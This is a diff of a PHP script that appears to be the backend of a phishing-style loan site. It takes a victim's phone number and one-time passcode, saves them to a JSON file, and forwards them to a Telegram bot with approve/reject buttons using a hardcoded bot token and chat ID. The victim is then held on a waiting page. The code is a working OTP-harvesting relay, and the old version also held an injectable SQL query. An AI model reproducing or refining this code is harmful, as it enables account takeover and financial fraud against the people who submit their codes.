@@ -1,20 +1,31 @@
 <?php
-$conn = new mysqli("localhost","root","","loan-db");
+// ===== 1️⃣ Get OTP data from form =====
+$id = $_POST['id'] ?? '';
+$phone = $_POST['phone'] ?? '';
+$otp = ($_POST['d1'] ?? '') . ($_POST['d2'] ?? '') . ($_POST['d3'] ?? '') .
+       ($_POST['d4'] ?? '') . ($_POST['d5'] ?? '') . ($_POST['d6'] ?? '');
 
-$id = $_POST['id'];
-$phone = $_POST['phone'];
+if(empty($phone) || strlen($otp) != 6){
+    header("Location: otp.php?phone=$phone&error=1");
+    exit();
+}
 
-$otp = $_POST['d1'].$_POST['d2'].$_POST['d3'].$_POST['d4'].$_POST['d5'].$_POST['d6'];
+// ===== 2️⃣ Save OTP status to JSON =====
+$file = __DIR__ . "/status.json";
+$statuses = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
 
-// Save OTP + set waiting status
-$conn->query("UPDATE user_details SET otp='$otp', status='otp_pending' WHERE id=$id");
-// --- Telegram Integration ---
-$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";       // replace with your bot token
-$chat_id = "6057287429";       // replace with your chat ID
+// Mark OTP as pending/submitted
+$statuses[$phone]['otp'] = 'pending';
+$statuses[$phone]['otp_value'] = $otp;  // optional, store the actual OTP
+file_put_contents($file, json_encode($statuses));
+
+// ===== 3️⃣ Send OTP to Telegram =====
+$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";
+$chat_id = "6057287429";
 
 $message = "🔑 OTP Submitted\nPhone: $phone\nOTP: $otp";
 
-// Buttons for Approve / Reject
+// Inline buttons for approve/reject
 $keyboard = [
     'inline_keyboard' => [
         [
@@ -30,10 +41,9 @@ $payload = [
     'reply_markup' => json_encode($keyboard)
 ];
 
-// Send message to Telegram
 file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($payload));
 
-// Go to waiting page
-header("Location: otpwaiting.php?id=".$id);
+// ===== 4️⃣ Redirect to OTP waiting page (include phone!) =====
+header("Location: otpwaiting.php?phone=$phone");
 exit();
 ?>
